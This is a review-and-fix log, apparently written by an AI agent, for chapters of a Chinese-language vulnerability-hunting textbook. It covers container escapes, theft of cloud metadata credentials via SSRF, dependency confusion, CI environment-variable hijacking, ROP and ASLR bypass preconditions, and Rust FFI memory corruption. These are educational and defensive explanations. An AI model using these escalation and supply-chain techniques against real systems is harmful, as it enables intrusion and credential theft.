- **閉卷審查異議維持**：審查意見提及 PortSwigger Web LLM attacks 題目難度原文未附於閉卷證據庫，經核對外部文獻與實務靶場設計，關卡名稱與難度標記維持現狀。

---

## 2. `ch17-containers-and-kubernetes.md`

### `verdict == "incorrect"` 裁決與修補（3 項全數裁決修正）

1. **容器隔離原語呼叫與 cgroups 機制之技術定義**
   - **審查意見**：`clone`/`unshare` 建立命名空間，`pivot_root`/`chroot` 切換根目錄，cgroups 限制配額在於將行程加入控制器群組而非單純掛載檔案系統。
   - **裁決與修補**：成立。於 `## 從你已知的出發` 錨點修訂為「容器執行時期在啟動 Linux 行程時，會透過 clone(2) 或 unshare(2) 為行程設定獨立的 Namespace 視圖、透過 pivot_root(2)（或 chroot(2)）切換根檔案系統，並將行程納入已配置資源配額控制器的 cgroup 中，這是容器隔離的技術基礎」。
2. **`RuntimeDefault` seccomp 攔截條件與非 Unconfined 狀態**
   - **審查意見**：容器非 `Unconfined` 亦可能套用放行該呼叫的自訂 `Localhost` 設定檔；且攔截動作由所載入規則決定。
   - **裁決與修補**：成立。於正文（第 72 行）與自我檢核第 3 題修訂為「Docker 與 containerd 的標準 RuntimeDefault seccomp 設定檔預設將 open_by_handle_at 列為拒絕項目（通常回傳 EPERM），因此當容器明確套用該 RuntimeDefault 設定檔（而非處於 Unconfined 或放行該呼叫的自訂 Localhost 規則）時，核心會在進入系統呼叫處理前直接攔截」。
3. **NexusPay RBAC Worked Example「最短 3 步」提權之嚴謹性**
   - **審查意見**：該案例描述一條具備環境前提（無准入限制、節點部署高權限 Pod）的提權鏈，未證明所有可能路徑的長度下界。
   - **裁決與修補**：成立。將標題與正文中的「最短 3 步」修訂為「3 階段提權推導（3 階段路徑）」，並在第 116–164 行完整列出拓樸前提與各階段條件。

### 關鍵 `imprecise` 補強與細節校準

- **未隔離核心參數與 `/dev` 裝置節點表述**（第 46 行）：修訂為「核心模組載入介面、核心訊息環形緩衝區（dmesg）以及大量未經命名空間隔離的核心參數皆具全系統作用（容器可見的 /dev 裝置節點與存取權則取決於掛載、執行時期配置與 cgroup 裝置控制器規則）」，修正審查指出將 `/dev` 視為完全全系統共享的語病。
- **cgroups v1 `release_agent` 逃逸前提**（第 52 行）：明確寫出僅在 `cgroups v1` 架構下且群組為空、無子群組時觸發，並註明純 `cgroups v2` 已移除該介面。
- **Bound ServiceAccount Token 時效性**（第 99、438 行）：明確註明 `3600 s` 為常見預設請求期限，由 kubelet 定期續簽，與 NexusPay 應用層 JWT（`900 s`）分開。
- **RBAC 隱蔽提權動詞邊界**（第 110 行）：補充既有 RoleBinding 的 `roleRef` 不可變更，`patch`/`update` 僅能增修 `subjects`。

---

## 3. `ch18-cloud-iam-and-lateral-movement.md`

### `verdict == "incorrect"` 裁決與修補（9 項全數裁決修正）

1. **SSRF 與 IMDSv1 憑證竊取之前提鏈**
   - **審查意見**：存在 SSRF 不等同憑證可讀，尚須實例掛載角色、中繼資料端點可達且回應內容可讀回。
   - **裁決與修補**：成立。於第 5 行修訂為「當掛載了 IAM Role 的雲端實例開啟了可達的中繼資料端點，且應用程式存在可讀回回應的伺服器端請求偽造（SSRF，見第 11 章）加上實例未強制啟用 IMDSv2 防護（或攻擊者已透過容器／宿主節點層失守取得符合中繼資料服務協定與網路跳數要求的本機請求能力，見第 17 章）時，攻擊者便能透過 Link-Local 位址向中繼資料服務領取綁定於該實例的臨時安全憑證」。
2. **Hop Limit = 2 封包穿透與節點 Role 暴露範疇**
   - **審查意見**：調升至 2 僅保證封包能穿過一次三層轉發，實際暴露受網路政策與節點是否配置角色約束。
   - **裁決與修補**：成立。於 Worked Example 1（第 91 行）與自我檢核第 1 題修訂為「位於一層 Bridge/NAT 後且未受額外網路政策封鎖的容器即可成功取得 Token！這會使節點上所有能路由至 169.254.169.254 的 Bridge 容器都能接觸整台宿主節點的高權限 IAM Role」。
3. **Hop Limit = 1 與 `hostNetwork: true` Pod 邊界**
   - **審查意見**：共用宿主網路的 Pod 經零跳即可直連 IMDS，單靠調降 Hop Limit 無法阻斷。
   - **裁決與修補**：成立。於第 95 行明確補充「若存在 hostNetwork: true 的 Pod 仍須配合節點防火牆／網路政策封鎖 169.254.169.254 並將節點 Role 權限最小化」。
4. **`Explicit Deny` 於身分切換後之求值上下文**
   - **審查意見**：原角色的拒絕規則隨原角色的請求評估；切換至新執行身分後，新請求改依新身分適用的策略求值。
   - **裁決與修補**：成立。於第 115、243 行精確說明「附著在某個角色 Identity Policy 上的 Explicit Deny，只在該角色本身作為當前請求的呼叫主體（Caller）時才會進入求值上下文。一旦該角色能創造或啟動另一個『具備不同執行身分』的運算實例，原角色專屬的 Explicit Deny 就不會隨身分切換而移轉」。
5. **S3 物件讀取控制層之完整性**
   - **審查意見**：S3 四項原生控制外，尚受 Organizations SCP、Permissions Boundary、VPC 端點條件與 SSE-KMS 解密授權交叉制約。
   - **裁決與修補**：成立。於第 253 行修訂為「S3 物件能否被讀取，首先取決於 S3 本身的四個核心存取控制層（再結合適用的 Organizations SCP、Permissions Boundary、VPC Endpoint 條件以及 SSE-KMS 解密授權）」。
6. **KMS 解密授權判定與 Key Policy 委派**
   - **審查意見**：解密授權可透過 Key Policy 直接授予、帳號委派之 IAM 策略或 KMS Grant 生效，非僅看身分是否列於 Key Policy。
   - **裁決與修補**：成立。於第 262 行修訂為「若該請求主體對該 CMK 不具備有效的 kms:Decrypt 授權（綜合評估 KMS Key Policy、其允許的同帳號 IAM 委派、KMS Grant 及拒絕條件後未通過），S3 仍會拒絕解密並回傳 403 AccessDenied」。
7. **SSE-KMS 與 `aws:SourceVpce` 控制項分類**
   - **審查意見**：`aws:SourceVpce` 為條件鍵，非 SSE-KMS 自帶屬性。
   - **裁決與修補**：成立。於第 283 行縱深防禦表修訂為「啟用 SSE-KMS 驗證 kms:Decrypt 並於策略加上 aws:SourceVpce 等網路條件」。
8. **動手做參考解答之策略驗證腳本與授權判定交付**
   - **審查意見**：原參考解答缺少開發部署角色之授權測試與 Python 策略求值腳本。
   - **裁決與修補**：成立。於第 512–705 行完整實作本地 LocalStack 雙角色部署，並撰寫獨立的 `/tmp/eval_iam.py` 確定性比對修補前後的授權判定；並將第 631 行 zh-prose 警示「進行修補前後的授權判定比對」外科修訂為「以比對修補前後的授權判定」。
9. **外部靶場練習之風險標記**
   - **審查意見**：CloudGoat 部署真實雲端資源並產生費用，與「零風險」矛盾。
   - **裁決與修補**：成立。將標題修訂為「#### 外部靶場延伸練習」，並顯式標註「注意成本與範圍：CloudGoat 會透過 Terraform 在你的個人測試用 AWS 帳號部署真實雲端資源（會依實際啟用的資源與時長產生雲端費用），演練結束後務必立刻執行 cloudgoat destroy 確認所有資源已清除」。

---

## 4. `ch19-supply-chain-and-cicd.md`

### `verdict == "incorrect"` 裁決與修補（8 項全數裁決修正）

1. **建置節點失守對下游發布影響之前提**
   - **審查意見**：僅有建置或發布權限無法保證簽章與部署成功，須同時握有簽章與發布權或產物獲自動放行。
   - **裁決與修補**：成立。於第 5 行修訂為「一旦同時握有簽章與發布推播權限的建置節點失守（或遭竄改的產物進入受信任的自動簽章與發布流程），攻擊者無須尋找應用程式執行期的記憶體破口，就能將惡意程式碼隨建置產物簽章並推送到下游伺服器」。
2. **投毒產物對下游微服務之實質接管條件**
   - **審查意見**：下游接管以產物獲准部署、受影響程式碼被執行且執行身分具備相應權限為前提。
   - **裁決與修補**：成立。於第 31 行修訂為「只要下游微服務與客戶端拉取並部署該產物、且在啟動或運行時載入受影響的程式碼路徑，就會在該服務執行身分的權限範圍內遭植入後門或接管」。
3. **Dependency Confusion 根因與 SemVer 版本偏好機制**
   - **審查意見**：根因在於名稱缺乏專屬來源綁定；版本號偏好發生於公私有來源同時提供候選版本之代理情境。
   - **裁決與修補**：成立。於第 45 行修訂為「Dependency Confusion（依賴混淆）的根源，在於套件管理器對『套件名稱所屬來源（Registry）』缺乏唯一且強制綁定——且在公私有來源同時提供候選版本的聚合代理情境下，解析器預設常優先挑選符合範圍的較高語意化版本號（SemVer）」。
4. **無版本 `npm install` 與預設 dist-tag**
   - **審查意見**：未帶版本安裝依賴預設 dist-tag（通常為 latest），非必然選中任意高版本號。
   - **裁決與修補**：成立。於第 53 行修訂為「在未鎖定上界如 *、>=1.0.0，或直接執行未指定版本的 npm install nexuspay-ledger-core 且公有 latest dist-tag 指向該新版時發布 99.0.0；或針對 ^1.4.2 發布符合範圍的 1.99.0」。
5. **Rust `build.rs` 與 Procedural Macros 執行時機**
   - **審查意見**：`cargo check` 與 IDE 巨集展開在全新編譯或快取失效時執行相應腳本，增量快取命中時不重複執行。
   - **裁決與修補**：成立。於第 83 行與自我檢核第 4 題解答修訂為「在首次編譯或未命中有效建置快取時，Rust 的 build.rs 與實際被展開的 proc_macro（程序巨集，包含衍生巨集、屬性巨集與類函式巨集）只要進入當次檢查的編譯目標，就會在編譯期被編譯並執行……只要執行觸及該依賴的 cargo check、或開發者用 VS Code 開啟專案並觸發預設啟用建置腳本與巨集展開的 rust-analyzer 背景分析，就可能直接執行」。
6. **補丁版號解析與最高可用相容版本**
   - **審查意見**：`^2.4.0` 包含 `>=2.4.0 <3.0.0`，解析選中 `2.4.2` 以其為當前最高可用版本為前提。
   - **裁決與修補**：成立。於第 165 行修訂為「若攻擊者發布相容的新補丁版號（例如 2.4.1 -> 2.4.2，且 2.4.2 為該範圍內目前最高的可用版本），所有使用 ^2.4.0 範圍、未鎖定 Lockfile 且重新向該來源解析最高可用版本的下游客戶與微服務，在下次建置並執行到該套件時便會安裝並載入惡意版本 2.4.2」。
7. **`GITHUB_ENV` 與 `GITHUB_PATH` 污染機制區分**
   - **審查意見**：寫入 `GITHUB_ENV` 改變環境變數（如 `LD_PRELOAD`），寫入 `GITHUB_PATH` 改變命令搜尋目錄順序。
   - **裁決與修補**：成立。於第 181 行修訂為「3. 跨步驟環境變數與搜尋路徑污染（GITHUB_ENV / GITHUB_PATH）：即使在同一個 Ephemeral Runner 內，若步驟 A 允許不可信輸入寫入 $GITHUB_ENV（注入如 LD_PRELOAD、NODE_OPTIONS 等危險環境變數）或寫入 $GITHUB_PATH（將攻擊者可控目錄如 /tmp/bin 前置於 PATH 搜尋順序），後續步驟 B 在以名稱查找並呼叫 git 或 npm 等外部命令時，命令解析結果與執行行為就會被劫持」。
8. **任務一實驗對 Scoped 路由與 `--ignore-scripts` 之完整驗證**
   - **審查意見**：原實驗僅測試本地 tarball 與腳本停用，缺少 Scope 綁定與聚合來源解析差異對照。
   - **裁決與修補**：成立。於第 317–383 行完整實作「未綁定 Scope 時 SemVer 優先選中 99.0.0 並觸發 postinstall」與「遷移至 @nexuspay/ledger-core 搭配 .npmrc scope 鎖定與 ignore-scripts=true」之雙重防禦對照實驗。

---

## 5. `ch20-binary-and-memory-layout.md`

### `verdict == "incorrect"` 裁決與修補（12 項全數裁決修正）

1. **跨越 FFI 邊界之安全性邊界轉移**
   - **審查意見**：作業系統行程隔離與 Rust 編譯期型別系統依然生效，受託管環境提供的是自動邊界檢查與生命週期維護。
   - **裁決與修補**：成立。於第 3 行修訂為「進入以 C、C++ 或 unsafe Rust 編譯出的原生機器碼區段時（儘管作業系統層級的行程／容器隔離以及 Rust 編譯期的型別系統仍然生效），受托管執行時期針對單一陣列與指標提供的自動邊界檢查與生命週期保護便不復存在，必須改由原生函式與呼叫端共同維持記憶體安全不變量」。
2. **任意程式碼執行與任意讀取之權限範疇**
   - **審查意見**：任意讀取外洩可及記憶體，任意程式碼執行運作於 Worker 行程既有作業系統與容器限制內。
   - **裁決與修補**：成立。於第 30 行修訂為「攻擊者就等同於在該 API Gateway Worker 行程的既有作業系統與容器權限下取得控制權；若取得的是任意或越界記憶體讀取原語，則能直接讀取該 Worker 可達記憶體內的活躍請求、環境變數與已載入的連線池或驗證憑證」。
3. **Linux 可執行檔格式涵蓋範圍**
   - **審查意見**：直譯器腳本（shebang）亦可由 Linux 執行，ELF 為原生二進位格式。
   - **裁決與修補**：成立。於第 36 行修訂為「Linux 上的原生可執行檔、共享函式庫（.so）與可重定位目標檔（.o）皆採用 ELF」。
4. **`.rodata` 頁面權限與 PLT 呼叫路徑**
   - **審查意見**：執行期頁面權限由載入片段 `PT_LOAD` 決定；直接呼叫或 `-fno-plt` 可省略跳板。
   - **裁決與修補**：成立。於第 68、73 行修訂為「實際執行期頁面權限由其所歸屬的 PT_LOAD 載入片段決定」與「在採用傳統 PLT 呼叫外部函式（例如 memcpy@plt，未開啟 -fno-plt 時）會先跳進一段短小的跳板指令」。
5. **非規範位址存取之硬體例外與核心訊號對應**
   - **審查意見**：非規範存取依定址語意觸發 `#GP` 或 `#SS`，Linux 核心在使用者態通常轉換為 `SIGSEGV` 或 `SIGBUS`。
   - **裁決與修補**：成立。於第 99 行修訂為「任何對這段位址的解參考都會立刻觸發 CPU 硬體例外（依指令與區段定址語意觸發 #GP General Protection Fault 或在隱式／顯式堆疊區段存取時觸發 #SS Stack-Segment Fault，Linux 核心在使用者態下通常將其轉換為 SIGSEGV 或 SIGBUS 訊號傳遞給行程）」。
6. **ASLR / PIE 行程版圖之獨立隨機化與固定偏移**
   - **審查意見**：同一映像內部相對偏移固定，不同獨立映射各自隨機化；非 PIE 載入位址取決於連結腳本（`0x400000` 為常見值）。
   - **裁決與修補**：成立。於第 102、109 行修訂為「啟用 ASLR 與 PIE 後，各獨立映射的基底位址會各自隨機偏移，而同一映像內部的各區段相對偏移則保持固定」與「(若非 PIE 則常預設固定於 0x400000)」。
7. **主執行檔 PIE 與全行程隨機化之協同**
   - **審查意見**：`ET_DYN` 賦予主程式重定位能力，全行程基底隨機化尚須核心開啟 ASLR。
   - **裁決與修補**：成立。於第 232 行修訂為「只有當核心開啟 ASLR 且主執行檔也編譯為 ET_DYN（-fPIE -pie）時，行程中的所有主要載入映像基底才會全數納入隨機化（各映像內部的相對符號偏移與頁內低 12 位元仍保持固定）」。
8. **ROP 返回 `libc` 函式時之堆疊對齊數學推導**
   - **審查意見**：函式第一條指令入口處 `RSP % 16 == 8`（因 `call` 壓入 8 位元組）；以 `ret`（ROP）進入時缺少該次壓棧使入口 `RSP % 16 == 0`，序言後內部框架錯位為 `mod 16 == 8`，導致 `movaps` 存取未對齊位址崩潰。
   - **裁決與修補**：成立。於自我檢核第 1 題解答與 `#### 3. 16-byte 堆疊對齊不變量` 完整推導：`call` 前 `RSP % 16 == 0`，進入第一條指令 `RSP % 16 == 8`；以 `ret` 直接跳入使第一條指令 `RSP % 16 == 0`，函式序言（如 `push rbp; sub rsp, N`）配置後使內部堆疊錯位為 `mod 16 == 8`，觸發 `movaps` `#GP`。
9. **`parse_tlv_frame` 堆疊佈局圖之狀態界線**
   - **審查意見**：序言指令僅配置堆疊空間，局部變數與 Canary 於後續指令寫入。
   - **裁決與修補**：成立。於第 200 行標註「parse_tlv_frame 執行序言 (push rbp; mov rbp, rsp; sub rsp, 0x30)、寫入 Canary 並完成局部變數賦值後的典型堆疊幀佈局」。
10. **64 位元 ASLR 暴力猜測與資訊洩漏之關係**
    - **審查意見**：暴力猜測具可計算之期望耗時（1.55 至 3.11 天），資訊洩漏使基底未知數降為零，屬實務高效率手段而非唯一邏輯條件。
    - **裁決與修補**：成立。於第 270 行修訂為「在此類硬化目標上，實務利用通常需要先尋找『資訊洩漏（Info Leak）』原語——只要洩漏出目標模組內已知偏移的一個合法指標，減去固定的頁內與區段偏移，就能以 O(1) 時間將該模組的 28-bit 基底不確定性降為 0」。
11. **No RELRO 與 Full RELRO 之保護範圍與符號綁定**
    - **審查意見**：No RELRO 缺少 `PT_GNU_RELRO` 保護；Full RELRO 提前完成相關符號重定位並將包含 `.got` 與 `.got.plt` 之整個 GOT 設為唯讀。
    - **裁決與修補**：成立。於第 283–285 行明確區分 No RELRO、Partial RELRO 與 Full RELRO 針對 `.init_array`、`.fini_array`、`.dynamic` 及 `.got.plt` 的唯讀保護範圍。
12. **非 PIE 主程式下控制流劫持之必要條件**
    - **審查意見**：固定載入位址降低基底不確定性，完整控制流劫持仍須存在記憶體破口與可用 gadgets。
    - **裁決與修補**：成立。於第 296 行修訂為「一旦程式存在足以劫持控制流的記憶體漏洞，攻擊者只要利用主程式內的固定位址指令（ROP gadgets）與 PLT stub 就能構成控制流劫持，無須先洩漏其他函式庫的隨機化基底」。

---

## 6. 自動化檢驗結果

- **結構與詞彙檢查 (`lint_book.py`)**：
  ```bash
  python3 tools/md-reader/lint_book.py books/vuln-hunting/book-src --lang zh-TW --config books/vuln-hunting/book-src/_meta/lint.config.json
  ```
  - **Slice 4 章節（Ch16, Ch17, Ch18, Ch19, Ch20）檢驗結果**：**0 Errors, 0 Warnings**（第 18 章第 631 行繁體中文動詞警告已全數修正；全書其餘未通過章節均位於本 slice 外部，未予觸碰）。
- **圖表與 ASCII 對齊檢查 (`check_diagrams.py`)**：
  ```bash
  python3 tools/md-reader/check_diagrams.py books/vuln-hunting/book-src
  ```
  - **檢驗結果**：`{"passed": true, "findings": []}`，**0 Errors, 0 Warnings**。
- **規範結構與格式驗證**：
  - 全部 5 章均嚴格包含 6 個規範 H2 標題（`## 從你已知的出發`、`## 機制與推導`、`## 故障模式與防禦`、`## 動手做`、`## 自我檢核`、`## 延伸閱讀`）。
  - 全部 5 章的第一個 H3 標題均為 `### 攻擊者目標與實質影響`。
  - 全部 5 章均包含難度、預估時間與 `### 參考解答`。
  - CommonMark 粗體與標點規範（Pitfall #13）：全部外層標點均置於 `**...**` 外部，零破裂。
  - 全書基準常數：全數嚴格吻合 `_meta/running-examples.md`，零偏離。


<!-- source: verify-log-r2-slice-5.md -->
# P4 Round-2 Adjudication & Surgical-Fix Log — `slice-5`

- **Agent**: `p4-r2-5` (`gemini-4-argon-medium`)
- **Reviewer Cache**: `books/vuln-hunting/book-src/_meta/review-sol62-medium-cache/` (`codex:gpt-6.2-sol:medium`)
- **Assigned Slice (`slice-5`)**:
  1. `ch21-reverse-engineering.md`
  2. `ch25-rust-unsafe-and-ffi.md`
  3. `ch28-static-and-variant-analysis.md`
  4. `ch29-fuzzing-engineering.md`
  5. `ch30-symbolic-execution-and-hybrid-fuzzing.md`

---

## 1. `ch21-reverse-engineering.md`

### `incorrect` Findings Adjudicated & Fixed (5/5)
1. **Claim**: `"「這些關鍵 Sink 的名稱與呼叫點永遠不會因為 strip -s 而消失。」"`
   - **Adjudication**: Valid technical refinement. While `.dynsym`/`.dynstr` and `.rela.plt`/`.plt` preserve symbol names and direct PLT/GOT call sites after `strip -s`, compiler-inlined calls (e.g., small `memcpy` expanded to SIMD/rep instructions) or runtime `dlsym` indirect calls do not go through a named PLT stub.
   - **Surgical Fix**: Clarified in `### Stripped Binary 的真相` and `### 函式邊界識別與標準庫指紋` that `strip -s` cannot remove dynamic symbol entries or direct call sites routed through `.plt`/`.plt.sec`/`.got` relocations, while inlined operations and `dlsym` calls require instruction-pattern or dynamic analysis.
2. **Claim**: `"「INT_LEFT 等微操作：先依移位量計算 CF、ZF、SF 等狀態旗標，再執行 EAX = EAX << 3。」"`
   - **Adjudication**: Genuine data-flow order defect. `ZF` (zero check) and `SF` (sign bit) depend on the 32-bit shifted result of `EAX << 3`, whereas `CF` is determined by the last bit shifted out of the original value.
   - **Surgical Fix**: Reordered step 4 of the Raw P-code sequence so `CF` and `EAX = EAX << 3` are evaluated first, followed by updating result-dependent flags (`ZF`, `SF`, `PF`) and `RAX = zext(EAX)`.
3. **Claim**: `"「某個 32 位元無號變數被預設推測為有號 int 或未定義寬度的 undefined4。」"`
   - **Adjudication**: Valid defect. Ghidra's `undefined4` explicitly denotes a known 4-byte (`32-bit`) width whose concrete type and signedness remain undetermined.
   - **Surgical Fix**: Updated wording to `已知寬度為 4 bytes 但具體型別與符號性尚未確定的 undefined4`.
4. **Claim**: `"「紀錄……相對位址偏移（假設 Ghidra 基底為 0x00100000，位址為 0x00101xxx，則檔內偏移即為 0x1xxx）。」"`
   - **Adjudication**: Valid ELF terminology fix. Subtracting `ImageBase` yields the Relative Virtual Address (RVA); converting to a physical file offset additionally depends on the `PT_LOAD` segment's `p_vaddr` and `p_offset`.
   - **Surgical Fix**: Renamed the difference to RVA (`相對於映像基底的相對虛擬位址偏移 RVA`) and noted `PT_LOAD` `p_vaddr`/`p_offset` mapping, and aligned Self-Check #4 to specify matching static and runtime reference bases of the same `PT_LOAD` segment.
5. **Claim**: `"「讓編譯器在能推導緩衝區大小的場景將 memcpy/strcpy 替換為附帶邊界檢查的 __memcpy_chk。」"`
   - **Adjudication**: Valid accuracy fix. `memcpy` and `strcpy` map to distinct fortified functions (`__memcpy_chk` vs. `__strcpy_chk`), and calls statically proven safe at compile time do not emit runtime check calls.
   - **Surgical Fix**: Updated the `-D_FORTIFY_SOURCE=3 -O2` bullet to distinguish `__memcpy_chk` and `__strcpy_chk` and note compile-time proof vs. runtime checking.

### High-Value `imprecise` Findings Resolved & Remaining Dismissals
- **Resolved**: Clarified SIB addressing (`[rbx + rcx*8 + 0x10]`) under a unit-stride raw index `rcx`; refined Lab Step 3 reference answer to describe the 4 candidate fields covering the observed 16-byte access range (matching `nexus_tlv_ctx_t`) and missing destination capacity check on `trace_buf[32]`.
- **Dismissed**: Closed-book nitpicks requesting live build logs or empirical surveys on `.eh_frame` FDE percentage / FLIRT CRC byte ranges / pwn.college UI syllabus paths (already covered by `_meta/landscape-2026-11.md` and instructional design).

---

## 2. `ch25-rust-unsafe-and-ffi.md`

### `incorrect` Findings Adjudicated & Fixed (7/7)
1. **Claim**: `"只要這條跨界鏈路上有任何一個 unsafe 區塊違背了 Rust 的 Soundness 不變量，或是 N-API 沒有守住外部記憶體的跨執行緒生命週期，前面二十四章出現過的所有記憶體損毀原語……都會在 Rust 編譯器完全靜默的情況下重新出現。"`
   - **Adjudication**: Valid precision fix. The compiler still enforces normal type and borrow checks inside `unsafe`, and each specific precondition violation maps to its corresponding memory corruption class.
   - **Surgical Fix**: Updated the introduction to explicitly map each violated precondition (length wrap-around/unchecked pointer copy -> OOB write/heap corruption; `MaybeUninit`/padding misuse -> uninitialized read; N-API cross-thread lifetime mismatch -> UAF) while noting that ordinary type/borrow checks still run inside `unsafe`.
2. **Claim**: `"`unsafe` 關鍵字在 Rust 語言規範中只開啟五項特定操作權限（俗稱五種超能力）"`
   - **Adjudication**: Valid syntactic distinction. Four operations are unlocked inside `unsafe { ... }` blocks, whereas implementing an `unsafe trait` uses `unsafe impl` at the declaration site (alongside `unsafe fn`, `unsafe trait`, and Rust 2024 `unsafe extern`).
   - **Surgical Fix**: Distinguished block-level operations from declaration-site contracts in the 5-item list.
3. **Claim**: `"後續所有緩衝區配置函式只接受安全型別，徹底消除重複檢查漏網之魚。"`
   - **Adjudication**: Valid refinement. A validated length newtype (`ValidatedTlvLen`) enforces the numeric protocol bound (`<= 65_536`), but the parser must still verify that the actual input buffer length is at least `8 + len`.
   - **Surgical Fix**: Added explicit mention that the parser must still check `raw.len() >= 8 + len` against the actual input buffer.
4. **Claim**: `"可用空間僅 16 bytes (0x10)，實際寫入 512 bytes (0x200)：越界寫入量 = 512 - 16 = 496 bytes (0x1f0 bytes)！"`
   - **Adjudication**: Valid distinction between language/API contract and physical allocator layout. At the language contract level, `malloc(0)` grants `0 bytes` of writable capacity (so all `512 bytes` are out of bounds, matching ASan's `0-byte region` report); at the `ptmalloc2` `0x20` minimum chunk physical layout level, `+0x10` to `+0x20` spans `16 bytes`, so a 512-byte write extends `496 bytes` (`0x1f0`) past the next chunk boundary.
   - **Surgical Fix**: Explicitly separated the language/API contract level (`0 bytes` valid capacity, 512B OOB / UB) and the `ptmalloc2` physical chunk layout level (`16 bytes` to `+0x20`, extending `496 bytes` past the adjacent chunk header).
5. **Claim**: `"只要這四個環節中的加法回繞、有號轉型與 FFI 邊界沒有守住，actual_avail 與 hdr.len 之間的落差就會把 0x20 chunk 變成任意堆積毀損的起點。"`
   - **Adjudication**: Valid scoping fix. Also noted pointer alignment precondition when casting `raw as *const TlvHdr`.
   - **Surgical Fix**: Scoped the conclusion to the memory safety defect caused by the mismatch between `total_alloc` and `copy_len`, and noted the 4-byte alignment requirement of `raw as *const TlvHdr`.
6. **Claim**: `"一旦這個結構體透過 memcpy 或 N-API Buffer::from 序列化傳出，堆疊上殘留的記憶體碎片就會跟著送出。"`
   - **Adjudication**: Valid fix. Leaking requires copying out the raw storage representation containing residual stack/heap data in unzeroed padding holes (and forming `&[u8]` over uninitialized padding in Rust is itself immediate UB).
   - **Surgical Fix**: Clarified raw storage copy vs. field-by-field serialization and noted that reading uninitialized padding as `&[u8]` in Rust violates validity invariants.
7. **Claim**: `"C 函式庫配置出的物件，只能透過該 C 函式庫導出的專屬釋放函式（例如 nexus_frame_free(ptr)）在 Rust 的 Drop trait 實作內呼叫回收"`
   - **Adjudication**: Valid refinement. Deallocation must follow the pairing contract specified by the C API (an exported teardown function or a compatible `free` from the shared C runtime heap), optionally wrapped in Rust `Drop`.
   - **Surgical Fix**: Updated `### 4. 跨分配器釋放與 FFI 指標所有權混亂` to reflect API-contract-paired deallocation and `Drop` encapsulation.

### High-Value `imprecise` Findings Resolved & Remaining Dismissals
- **Resolved**: Clarified `MaybeUninit<[u8; 64]>` partial initialization via low-level read interfaces; separated narrowing (`u64 as u32`), same-width reinterpretation (`u32 as i32`), and sign-extending widening (`i32 as usize` on 64-bit); noted scaled 32-bit offsets in V8 Sandbox; distinguished Stacked Borrows (stack) vs. Tree Borrows (tree) in Self-Check #3.
- **Dismissed**: Closed-book cross-chapter context checks (`TB-4` in Ch01) and requests for live terminal transcripts.

---

## 3. `ch28-static-and-variant-analysis.md`

### `incorrect` Findings Adjudicated & Fixed (4/4)
1. **Claim**: `"Barrier：切斷兩類已證明安全的污點路徑。"`
   - **Adjudication**: Valid precision fix. In the QL query, `AllowlistGuard` checks method name (`includes`/`has`) and argument count, and `numCall` checks callee names (`parseInt`/`Number`), which are practical engineering approximations for the target codebase rather than formal proofs of safety for arbitrary receivers.
   - **Surgical Fix**: Updated the code comment and accompanying prose to describe these barriers as codebase-specific engineering approximation models and documented the additional constraints needed for untrusted third-party repos.
2. **Claim**: `"在固定 Sink 集合並針對該程式碼庫既有的常數白名單與數值轉型模式加入 isBarrier 後，Precision 從 9.09% 提升到 50.0% 且維持了 100.0% Recall。"`
   - **Adjudication**: Genuine arithmetic attribution fix. From the baseline (`5 / 55 = 9.09%`), Step 1 restricts `isSink` to argument 0, bringing Precision to `5 / 40 = 12.50%`. With the Sink set fixed after Step 1, adding the two `isBarrier` steps (Steps 2 & 3) raises Precision from `12.50%` (`5 / 40`) to `50.0%` (`5 / 10`). Also aligned the prose description of the baseline query's method list with the final query.
   - **Surgical Fix**: Explicitly stated both the Step 1 sink-restriction effect (`9.09% -> 12.50%`) and the fixed-sink barrier effect (`12.50% -> 50.0%`), totaling `9.09% -> 50.0%`.
3. **Claim**: `"malloc(0) 配置最小區塊後，memcpy 卻讀入無號的 hdr->len（4,294,967,288 位元組），造成毀滅性堆積溢位。"`
   - **Adjudication**: Valid C standard / allocator precision fix. `malloc(0)` may return `NULL` or a non-null pointer granting `0 bytes` of writable capacity; passing `4,294,967,288` to `memcpy` on a non-null result immediately triggers out-of-bounds write UB.
   - **Surgical Fix**: Updated Self-Check #3 answer to note `malloc(0)` return semantics (`NULL` or zero-capacity pointer / `0x20` glibc chunk) and the resulting OOB write UB.
4. **Claim**: `"藉由回傳型別（Option／Result）在編譯期強制呼叫端顯式處理執行期溢位與切片邊界檢查失敗。"`
   - **Adjudication**: Valid Rust semantics fix. `Option`/`Result` require unpacking the success branch before using the inner value, but callers can still discard a return value or call `.unwrap()` unless paired with lint rules (`#![deny(unused_must_use)]`, Clippy `unwrap_used`).
   - **Surgical Fix**: Clarified that `Option`/`Result` encode failures in the type system so callers must unpack the success value, and pairing with `#![deny(unused_must_use)]` and Clippy rules enforces explicit error handling.

### High-Value `imprecise` Findings Resolved & Remaining Dismissals
- **Resolved**: Clarified that static analysis precision/performance depends on both the IR level and the analysis algorithm/abstractions/models; refined AST description (retains syntax order/branch structure, lacks execution reachability/dominance graph); aligned the Patch Diffing example's pre-patch condition to `if (sz <= 65536 + 8)` so it matches the 65,536-byte payload limit plus 8-byte header; noted two's complement implementation semantics for `(int32_t)0xFFFF_FFF8 == -8`.
- **Dismissed**: Closed-book external tool version checks (Semgrep Tree-sitter language count, CodeQL CLI packaging details) already grounded in `_meta/landscape-2026-11.md`.

---

## 4. `ch29-fuzzing-engineering.md`

### `incorrect` Findings Adjudicated & Fixed (4/4)
1. **Claim**: `"你明確寫出輸入範圍、邊界斷言與預期輸出，藉此證明程式碼在設計路徑上表現正確。"`
   - **Adjudication**: Valid software-testing distinction. Unit and property tests verify that the tested inputs satisfy the specified assertions, but finite test cases cannot exhaustively prove correctness for all inputs along a path.
   - **Surgical Fix**: Updated `## 從你已知的出發` to state `藉此驗證受測案例在設計路徑上符合指定的業務斷言（但有限的測試案例只能證明已執行的輸入點符合斷言，無法窮舉證明整條路徑或整個輸入空間對所有可能輸入皆無缺陷）`.
2. **Claim**: `"經典隨機雜湊插樁 (afl-clang-fast / trace-pc-guard 64 KiB map)"`
   - **Adjudication**: Genuine instrumentation classification fix. Classic XOR (`cur_loc ^ (prev_loc >> 1)`) is `CLASSIC` mode, whereas `trace-pc-guard` (`PCGUARD`) assigns per-edge guard IDs rather than XORing block IDs (and was listed in item `[2]` of the same diagram).
   - **Surgical Fix**: Updated `[1]` in the ASCII comparison diagram to `(CLASSIC XOR 模式：cur_loc ^ (prev_loc >> 1))` and `[2]` to `(afl-clang-lto 連續索引 / PCGUARD 獨立守衛)` while preserving exact 70-column box width, and clarified in the prose that enlarging `AFL_MAP_SIZE` to reduce collisions requires an instrumentation mode whose index space scales beyond 16-bit XOR.
